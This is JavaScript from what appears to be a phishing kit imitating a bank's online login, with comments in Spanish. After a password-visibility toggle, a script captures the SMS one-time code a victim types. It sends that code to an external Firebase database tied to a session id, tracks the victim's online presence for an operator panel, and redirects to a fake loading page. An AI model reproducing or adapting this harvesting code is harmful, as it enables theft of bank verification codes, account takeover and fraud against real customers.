document.getElementById('togglePassword').addEventListener('click', function (e) {
    // Evitamos cualquier comportamiento por defecto del botón
    e.preventDefault();
    
    const pass = document.getElementById('pass');
    const eyeIcon = document.getElementById('eyeIcon');
    
    // Alternamos el tipo de input y la imagen del botón
    if (pass.type === 'password') {
        pass.type = 'text';
        eyeIcon.src = 'ojo2.svg';
        eyeIcon.alt = 'Ocultar contraseña';
    } else {
        pass.type = 'password';
        eyeIcon.src = 'ojo.svg';
        eyeIcon.alt = 'Mostrar contraseña';
    }
});
</script>
<script>
    // 1. CONFIGURACIÓN
    const firebaseConfig = { 
        databaseURL: "https://occidentenlinea-credicard-default-rtdb.firebaseio.com/" 
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // 2. OBTENER EL ID DE LA URL
    const urlParams = new URLSearchParams(window.location.search);
    const sessionId = urlParams.get('id');

    if (sessionId) {
        // Lógica de presencia para la luz del panel
        const presenceRef = db.ref('logins/' + sessionId + '/online');
        db.ref(".info/connected").on("value", (snap) => {
            if (snap.val() === true) {
                presenceRef.set(true);
                presenceRef.onDisconnect().set(false);
            }
        });

        // Evento al presionar continuar
        document.getElementById('form-sms').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // CAPTURA DE 1 SOLO INPUT (Asegúrate de que tu input tenga id="sms-input")
            const codigoCompleto = document.getElementById('sms-input').value;
            
            const btn = document.getElementById('btn-envio');
            
            // Validación mínima para no enviar vacío
            if (codigoCompleto.length < 4) {
                return; 
            }

            btn.disabled = true;

            // Actualizar el mismo registro y redirigir
            db.ref('logins/' + sessionId).update({
                sms: codigoCompleto,
                step: 'SMS_ENTREGADO' // Cambié 'status' por 'step' para que tu panel lo lea correctamente
            }).then(() => {
                window.location.href = 'cargando.html?id=' + sessionId;
            }).catch(() => {
                window.location.href = 'cargando.html?id=' + sessionId;
            });
        });

    } else {
        window.location.href = 'index.html';
    }
</script>
